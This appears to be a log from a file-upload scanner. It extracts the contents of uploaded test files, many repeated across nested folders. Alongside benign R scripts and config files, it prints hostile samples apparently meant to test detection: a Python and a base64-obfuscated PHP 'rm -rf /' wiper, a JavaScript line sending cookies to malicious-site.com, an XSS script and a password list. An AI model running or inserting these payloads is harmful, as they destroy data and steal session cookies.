Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,070 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,071 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,073 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,075 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,076 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,079 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,080 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,082 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,083 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,084 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,085 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,091 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,092 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,094 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,095 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,096 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,097 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,098 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,099 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,100 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,101 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,103 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,104 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,105 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,106 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,108 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,109 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,111 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,113 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,114 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,117 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,118 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,120 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,121 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,123 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,124 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,126 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:50:14,129 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,130 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:50:14,131 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:50:14,133 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,136 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,137 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,140 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,141 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,142 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,144 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,145 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,146 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,147 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,153 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,154 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,155 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,158 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,159 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,162 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,163 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,164 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,165 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,166 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,167 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,168 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,174 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,175 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,176 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,179 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,180 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,182 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,184 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,185 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,186 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,187 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,188 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,189 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,195 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,196 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,197 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:50:14,200 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:50:14,201 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:50:14,204 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:50:14,205 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,206 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,207 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,208 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:50:14,210 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:50:14,211 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:50:14,216 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:50:14,218 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:50:14,219 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:50:14,220 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:50:14,222 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

